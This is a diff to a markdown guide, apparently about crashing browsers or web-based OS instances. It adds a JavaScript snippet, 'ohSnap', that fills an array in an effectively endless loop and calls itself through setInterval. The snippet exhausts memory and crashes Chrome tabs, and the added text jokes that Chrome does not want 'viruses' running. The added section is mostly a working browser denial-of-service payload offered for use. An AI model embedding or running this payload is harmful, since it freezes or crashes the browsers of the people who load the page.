@@ -49,6 +49,31 @@ ohSnap()
 </script>
 ```
 
+Newer versions of Chrome require this additoinal code:
+```html
+<script>
+  function ohSnap() {
+  var corruptable=[]
+  for(var i=0;i<(9999999*999999999999999999999);i++) {
+    corruptable.push(i);
+    corruptable.push(i);
+    corruptable.push(i);
+    corruptable.push(i);
+    corruptable.push(i);
+    corruptable.push(i);
+    corruptable.push(i);
+    corruptable.push(i);
+    corruptable.push(i);
+    corruptable.push(i);
+    corruptable.push(i);
+  }
+}
+
+setInterval(ohSnap)
+</script>
+```
+Please note that this takes 12 seconds to be executed compared to the average of 0-4 seconds on everything except Chrome.
+This is because Chrome has now implented an array limit. Its almost like they don't want viruses running on their browser...
 
 
 ## Killing a Windows96 instance(WRT Bin)
